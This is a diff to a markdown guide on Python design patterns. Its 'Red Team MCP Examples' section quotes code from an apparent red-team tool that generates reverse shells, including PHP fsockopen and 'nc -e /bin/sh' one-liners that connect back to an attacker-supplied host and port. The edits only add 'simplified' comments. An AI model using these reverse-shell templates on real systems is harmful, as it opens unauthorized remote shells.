@@ -298,7 +298,7 @@ Once you see it that way, containers stop competing with classes and just become
 
 ## 6. Red Team MCP Examples
 
-Here are examples from this codebase demonstrating these patterns:
+Here are simplified examples from this codebase demonstrating these patterns. See the actual source files for complete implementations.
 
 ### Domain Classes (from `src/models.py`)
 
@@ -314,6 +314,7 @@ class ShellType(str, Enum):
     PYTHON = "python"
     PHP = "php"
     POWERSHELL = "powershell"
+    # ... additional types in actual implementation
 
 class ReverseShellInput(BaseModel):
     """Input model for reverse shell generation - a domain design with validation."""
@@ -406,6 +407,7 @@ def generate_reverse_shell(
         ),
         "php": f"php -r '$sock=fsockopen(\"{lhost}\",{lport});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
         "netcat": f"nc -e /bin/sh {lhost} {lport}",
+        # ... additional shell types in actual implementation
     }
     
     # Fast lookup by key with fallback
